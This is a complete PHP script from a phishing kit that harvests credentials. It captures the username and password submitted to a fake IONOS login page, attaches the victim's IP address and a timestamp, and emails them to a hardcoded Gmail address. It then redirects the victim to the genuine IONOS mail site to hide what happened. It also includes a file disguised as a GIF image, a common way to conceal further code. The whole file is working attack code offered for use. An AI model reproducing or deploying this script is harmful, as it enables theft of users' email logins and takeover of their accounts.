<?php
  
session_start();
include ("sec.gif");
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "--------      UserID      ------------------------------\n";
$message .= "Username: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--------------------------------------\n";
  
$recipient = "debra.white1000@gmail.com";
$subject = "IONOS II Logins - .$ip";
$headers = "From: James Bond<wirez@googledocsorg>";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
mail($userinfo,$subject,$message,$headers);
       {
           header("Location: https://mail.ionos.com/");
  
       }
  
  
?>